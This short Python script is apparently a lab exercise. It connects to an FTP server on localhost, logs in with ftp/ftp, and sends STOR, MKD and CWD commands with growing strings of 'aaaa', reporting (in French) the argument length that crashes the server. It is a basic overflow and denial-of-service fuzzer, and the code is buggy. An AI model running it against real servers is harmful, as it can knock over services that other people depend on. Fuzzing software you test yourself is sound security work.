import socket

host,port= "localhost", 21
s = socket.socket()
s.connect((host,port))

def read():
    data = s.recv(1024).decode()
    print(data)
    if data == "":
        pass

def leave():
    s.send("QUIT\r\n".encode("utf-8"))
    read()
    s.close()

read()
s.send("USER ftp\r\n".encode("utf-8"))
read()
s.send("PASS ftp\r\n".encode("utf-8"))
read()
arg = "aaaa"

try:
    for com in ['STOR','MKD','CWD']:
        for i in range(20,20000,20):
            arg = arg*i+"\r\n"
            s.send((com+" "+arg).encode("utf-8"))
            read()
            s.send((com+" "+arg).encode("utf-8"))
            read()
            s.send((com+" "+arg).encode("utf-8"))
            read()
            arg = "aaaa"
except:
    print("Nombre d'argument pour faire planter le server :",i*4) #x4 car 4 caractère a la base
    ko = True




if not ko:
    leave()
